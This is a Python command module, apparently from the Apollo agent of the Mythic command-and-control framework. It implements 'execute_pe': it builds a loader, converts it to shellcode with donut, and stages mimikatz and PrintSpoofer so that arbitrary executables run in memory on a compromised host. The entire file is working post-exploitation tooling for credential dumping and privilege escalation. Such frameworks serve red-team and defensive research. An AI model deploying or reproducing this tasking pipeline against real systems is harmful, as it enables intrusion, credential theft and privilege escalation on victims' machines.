from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
from uuid import uuid4
from mythic_container.MythicRPC import *
from os import path
import os
import asyncio
import platform

PRINTSPOOFER_FILE_ID = ""
MIMIKATZ_FILE_ID = ""

if platform.system() == "Windows":
    EXECUTE_PE_PATH = "C:\\Mythic\\Apollo\\srv\\ExecutePE.exe"
else:
    EXECUTE_PE_PATH = "/srv/ExecutePE.exe"

PE_VARNAME = "pe_id"


class ExecutePEArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pe_name",
                cli_name="PE",
                display_name="Executable to Run",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="PE to execute (e.g., mimikatz.exe).",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    ),
                ],
            ),
            CommandParameter(
                name="pe_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the PE.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2
                    ),
                ],
            ),
        ]

    async def get_files(
        self, inputMsg: PTRPCDynamicQueryFunctionMessage
    ) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(
                CallbackID=inputMsg.Callback,
                LimitByCallback=True,
                Filename="",
            )
        )
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = file_resp.Error
            return fileResponse

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require a PE to execute.\n\tUsage: {}".format(
                    ExecutePECommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.raw_command_line.split(" ", maxsplit=1)
            self.add_arg("pe_name", parts[0])
            self.add_arg("pe_arguments", "")
            if len(parts) == 2:
                self.add_arg("pe_arguments", parts[1])


class ExecutePECommand(CommandBase):
    cmd = "execute_pe"
    needs_admin = False
    help_cmd = "execute_pe [PE.exe] [args]"
    description = "Executes an unmanaged executable with the specified arguments. This executable must first be known by the agent using the `register_file` command."
    version = 3
    author = "@djhohnstein"
    argument_class = ExecutePEArguments
    attackmapping = ["T1547"]

    async def build_exepe(self):
        try:
            global EXECUTE_PE_PATH
            agent_build_path = tempfile.TemporaryDirectory()
            outputPath = "{}/ExecutePE/bin/Release/ExecutePE.exe".format(
                agent_build_path.name
            )
            copy_tree(str(self.agent_code_path), agent_build_path.name)
            shell_cmd = "dotnet build -c release -p:Platform=x64 {}/ExecutePE/ExecutePE.csproj -o {}/ExecutePE/bin/Release".format(
                agent_build_path.name, agent_build_path.name
            )
            proc = await asyncio.create_subprocess_shell(
                shell_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
            )
            stdout, stderr = await proc.communicate()
            if not path.exists(outputPath):
                raise Exception(
                    "Failed to build ExecutePE.exe:\n{}".format(
                        stderr.decode() + "\n" + stdout.decode()
                    )
                )
            shutil.copy(outputPath, EXECUTE_PE_PATH)
        except Exception as ex:
            raise Exception(ex)

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global MIMIKATZ_FILE_ID
        global PRINTSPOOFER_FILE_ID
        global PE_VARNAME
        global EXECUTE_PE_PATH

        taskData.args.add_arg("pipe_name", str(uuid4()))
        mimikatz_path = os.path.abspath(self.agent_code_path / "mimikatz_x64.exe")
        printspoofer_path = os.path.abspath(
            self.agent_code_path / "PrintSpoofer_x64.exe"
        )
        if platform.system() == "Windows":
            shellcode_path = "C:\\Mythic\\Apollo\\temp\\loader.bin"
        else:
            shellcode_path = "/tmp/loader.bin"

        if platform.system() == "Windows":
            donutPath = os.path.abspath(self.agent_code_path / "donut.exe")
        else:
            donutPath = os.path.abspath(self.agent_code_path / "donut")

        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
        proc = await asyncio.create_subprocess_shell(
            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()

        if not path.exists(EXECUTE_PE_PATH):
            await self.build_exepe()

        if platform.system() == "Windows":
            command = '{} -i {} -p "{}"'.format(
                donutPath, EXECUTE_PE_PATH, taskData.args.get_arg("pipe_name")
            )
        else:
            command = '{} -i {} -p "{}"'.format(
                donutPath, EXECUTE_PE_PATH, taskData.args.get_arg("pipe_name")
            )
        # print(command)
        # need to go through one more step to turn our exe into shellcode
        if platform.system() == "Windows":
            Currentwd = "C:\\Mythic\\Apollo\\temp\\"
        else:
            Currentwd = "/tmp"
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=Currentwd,
        )
        stdout, stderr = await proc.communicate()

        stdout_err = f"[stdout]\n{stdout.decode()}\n"
        stdout_err = f"[stderr]\n{stderr.decode()}"

        if not path.exists(shellcode_path):
            raise Exception("Failed to create shellcode:\n{}".format(stdout_err))
        else:
            with open(shellcode_path, "rb") as f:
                shellcode = f.read()
            file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(
                    TaskID=taskData.Task.ID,
                    Filename="execute_pe shellcode",
                    DeleteAfterFetch=True,
                    FileContents=shellcode,
                )
            )
            if file_resp.Success:
                taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
            else:
                raise Exception(
                    "Failed to register ExecutePE shellcode: " + file_resp.Error
                )

        # I know I could abstract these routines out but I'm rushing
        if taskData.args.get_arg("pe_name") == "mimikatz.exe":
            if MIMIKATZ_FILE_ID != "":
                taskData.args.add_arg(PE_VARNAME, MIMIKATZ_FILE_ID)
            else:
                with open(mimikatz_path, "rb") as f:
                    mimibytes = f.read()
                file_resp = await SendMythicRPCFileCreate(
                    MythicRPCFileCreateMessage(
                        TaskID=taskData.Task.ID,
                        Filename="execute_pe mimikatz",
                        DeleteAfterFetch=False,
                        FileContents=mimibytes,
                    )
                )
                if file_resp.Success:
                    taskData.args.add_arg(PE_VARNAME, file_resp.AgentFileId)
                    MIMIKATZ_FILE_ID = file_resp.AgentFileId
                else:
                    raise Exception("Failed to register Mimikatz: " + file_resp.Error)
        elif taskData.args.get_arg("pe_name") == "printspoofer.exe":
            if PRINTSPOOFER_FILE_ID != "":
                taskData.args.add_arg(PE_VARNAME, PRINTSPOOFER_FILE_ID)
            else:
                with open(printspoofer_path, "rb") as f:
                    psbytes = f.read()
                file_resp = await SendMythicRPCFileCreate(
                    MythicRPCFileCreateMessage(
                        TaskID=taskData.Task.ID,
                        Filename="execute_pe printspoofer",
                        DeleteAfterFetch=False,
                        FileContents=psbytes,
                    )
                )
                if file_resp.Success:
                    taskData.args.add_arg(PE_VARNAME, file_resp.AgentFileId)
                    PRINTSPOOFER_FILE_ID = file_resp.AgentFileId
                else:
                    raise Exception(
                        "Failed to register PrintSpoofer: " + file_resp.Error
                    )

        imageName = taskData.args.get_arg("pe_name")
        arguments = taskData.args.get_arg("pe_arguments")

        # Form the command line being passed to the PE. Pass the arguments as is
        commandline = f'"{imageName}" {arguments}'

        taskData.args.add_arg(
            "commandline",
            commandline,
            ParameterType.String,
            parameter_group_info=[ParameterGroupInfo(required=True)],
        )

        taskData.args.remove_arg("arguments")

        response.DisplayParams = "-PE {} -Arguments {}".format(
            taskData.args.get_arg("pe_name"), arguments
        )
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
